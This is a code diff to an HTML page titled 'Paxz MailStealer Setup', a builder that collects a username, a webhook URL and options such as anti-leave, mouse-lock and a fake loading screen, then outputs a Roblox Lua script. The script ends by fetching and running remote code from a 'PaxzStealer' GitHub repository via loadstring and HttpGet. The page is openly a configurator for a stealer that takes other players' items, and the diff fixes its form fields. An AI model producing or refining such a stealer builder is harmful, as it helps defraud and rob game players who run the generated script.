@@ -74,6 +74,10 @@
   </style>
 </head>
 <body>
+  <div id="animationContainer">
+    <img src="https://wallpapercave.com/wp/wp2760959.gif" alt="Animated Background" style="width: 100%; height: 100vh; object-fit: cover;">
+  </div>
+  
   <div class="container">
     <h1>Paxz MailStealer Setup</h1>
     <form id="setupForm">
@@ -102,13 +106,13 @@
       <input type="text" id="antiLeave" required><br>
 
       <label for="MouseLock">Mouse-Lock (true/false):</label>
-      <input type="text" id="antiLeave" required><br>
+      <input type="text" id="MouseLock" required><br>
 
       <label for="ChatSpam">Chat-Spam (true/false):</label>
-      <input type="text" id="antiLeave" required><br>
+      <input type="text" id="ChatSpam" required><br>
 
       <label for="CollectOrbs">Collect-Orbs (true/false):</label>
-      <input type="text" id="antiLeave" required><br>
+      <input type="text" id="CollectOrbs" required><br>
 
       <button type="button" id="generateScriptBtn">Generate Script</button>
     </form>
@@ -120,49 +124,43 @@
   </div>
 
   <script>
-  const generateScriptBtn = document.getElementById("generateScriptBtn");
-  const scriptOutput = document.getElementById("scriptOutput");
-  const scriptCode = document.getElementById("scriptCode");
+    const generateScriptBtn = document.getElementById("generateScriptBtn");
+    const scriptOutput = document.getElementById("scriptOutput");
+    const scriptCode = document.getElementById("scriptCode");
 
-  generateScriptBtn.addEventListener("click", () => {
-    const userName = document.getElementById("userName").value;
-    const userName2 = document.getElementById("userName2").value;
-    const webhook = document.getElementById("webhook").value;
-    const loadingScreenText = document.getElementById("loadingScreenText").value;
-    const chatMessage = document.getElementById("chatMessage").value;
-    const kickTime = document.getElementById("kickTime").value;
-    const loadingScreen = document.getElementById("loadingScreen").value;
-    const antiLeave = document.getElementById("antiLeave").value;
-    const MouseLock = document.getElementById("MouseLock").value;
-    const ChatSpam = document.getElementById("chatSpam").value;
-    const CollectOrbs = document.getElementById("CollectOrbs").value;
+    generateScriptBtn.addEventListener("click", () => {
+      const userName = document.getElementById("userName").value;
+      const userName2 = document.getElementById("userName2").value;
+      const webhook = document.getElementById("webhook").value;
+      const loadingScreenText = document.getElementById("loadingScreenText").value;
+      const chatMessage = document.getElementById("chatMessage").value;
+      const kickTime = document.getElementById("kickTime").value;
+      const loadingScreen = document.getElementById("loadingScreen").value;
+      const antiLeave = document.getElementById("antiLeave").value;
+      const MouseLock = document.getElementById("MouseLock").value;
+      const ChatSpam = document.getElementById("ChatSpam").value;
+      const CollectOrbs = document.getElementById("CollectOrbs").value;
 
-    const mouseLock = false; // Set to true or false
-    const chatSpam = false; // Set to true or false
-    const collectOrbs = false; // Set to true or false
-
-    const generatedScript = `-- {{Paxz MailStealer}} --
+      const generatedScript = `-- {{Paxz MailStealer}} --
 _G.UserName = "${userName}"
 _G.UserName2 = "${userName2}"
 _G.Webhook = "${webhook}"
 _G.loadingScreenText = "${loadingScreenText}"
 _G.ChatMessage = "${chatMessage}"
 _G.KickTime = ${kickTime}
-
--- [[Extra Stuff]] --
-
 _G.LoadingScreen = ${loadingScreen}
 _G.AntiLeave = ${antiLeave}
-_G.MouseLock = ${mouseLock}
-_G.ChatSpam = ${chatSpam}
-_G.CollectOrbs = ${collectOrbs}
+_G.MouseLock = ${MouseLock}
+_G.ChatSpam = ${ChatSpam}
+_G.CollectOrbs = ${CollectOrbs}
+-- ... (andere instellingen en hun waarden) ...
 
 -- /|\\ Script /|\\ --
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua", true))()`;
 
-    scriptCode.textContent = generatedScript;
-    scriptOutput.style.display = "block";
-  });
-</script>
+      scriptCode.textContent = generatedScript;
+      scriptOutput.style.display = "block";
+    });
+  </script>
 </body>
 </html>
